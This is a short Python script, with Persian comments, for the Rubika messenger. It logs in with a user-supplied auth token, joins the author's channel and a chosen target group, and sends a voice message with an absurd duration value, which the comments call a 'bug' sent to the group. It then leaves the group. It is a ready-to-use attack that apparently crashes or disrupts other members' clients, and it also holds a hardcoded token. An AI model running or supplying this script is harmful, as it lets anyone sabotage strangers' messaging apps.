YOUR_AUTH = "jgjqqpcvxnqelfwlskqfjkfolkmmevup"
#قسمت YOUR_AUTH اوث اکانتی که میخاین باگ رو بفرسته وارد کنید.
#------‐-----------------------------
TARGET_LINK = "https://rubika.ir/joing/DBDCFIEH0QAQJUPQCTQMEFOYDECLDQZE"
#قسمت TARGET_LINK لینک گروهی که میخاین باگ به اونجا فرستاده بشه رو وارد کنید.
#------‐-----------------------------
guid = "g0CQAf40797704b065c9735609f10973"
#گوید گروه رو وارد کنید
CAPTION_VOICE = "کوپص"
#قسمت CAPTION_VOICE یه کپشن دلخواه برای ویس وارد کنید.
#------‐-----------------------------
from libraryArsein.Arsein import *
import time
bot = Robot_Rubika(YOUR_AUTH)
bot.joinChannel("https://rubika.ir/joinc/BICFFEHB0GLSYZNJFFTBCGGZXCMBLFCA")
bot.joinGroup(TARGET_LINK)
file = "9552999603.mp3"
bot.sendVoice(guid,file,time="1000000000000000",caption=CAPTION_VOICE)
bot.leaveGroup(guid)